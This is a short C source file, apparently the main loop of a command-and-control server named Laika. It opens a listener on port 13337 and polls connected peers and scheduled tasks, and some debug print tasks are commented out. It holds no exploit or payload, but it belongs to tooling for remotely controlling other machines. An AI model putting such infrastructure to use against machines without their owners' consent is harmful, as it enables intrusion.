#include <stdio.h>

#include "ltask.h"
#include "cnc.h"

struct sLaika_taskService tService;

/*void debugTask1(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
    printf("hello 1 !\n");
}

void debugTask2(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
    printf("hello 2 !\n");
}

void debugTask3(struct sLaika_taskService *service, struct sLaika_task *task, clock_t currTick, void *uData) {
    printf("hello 3 !\n");
}*/

int main(int argv, char **argc) {
    struct sLaika_cnc *cnc = laikaC_newCNC(13337);

    laikaT_initTaskService(&tService);
    /*laikaT_newTask(&tService, 1000, debugTask1, NULL);
    laikaT_newTask(&tService, 500,  debugTask2, NULL);
    laikaT_newTask(&tService, 2000, debugTask3, NULL);*/

    while (true) {
        laikaC_pollPeers(cnc, laikaT_timeTillTask(&tService));
        laikaT_pollTasks(&tService);
    }

    laikaT_cleanTaskService(&tService);
    laikaC_freeCNC(cnc);
    LAIKA_DEBUG("cnc killed\n");
    return 0;
}